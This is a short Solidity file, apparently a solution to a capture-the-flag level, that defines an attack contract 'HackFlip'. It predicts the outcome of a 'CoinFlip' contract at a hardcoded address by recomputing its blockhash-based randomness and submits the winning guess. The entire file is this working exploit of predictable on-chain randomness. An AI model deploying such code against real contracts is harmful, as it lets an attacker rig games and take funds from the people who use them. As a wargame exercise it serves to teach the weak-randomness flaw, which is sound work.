pragma solidity ^0.4.18;

contract CoinFlip {
    function flip(bool _guess) public returns (bool){}
}

contract HackFlip {
    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address target = 0xa205d1ef4176ba51ea78b368b6e50f86b414c54c;

    function flip() public returns (bool) {
        CoinFlip f = CoinFlip(target);
        uint256 blockValue = uint256(block.blockhash(block.number-1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        f.flip(side);
    }
}
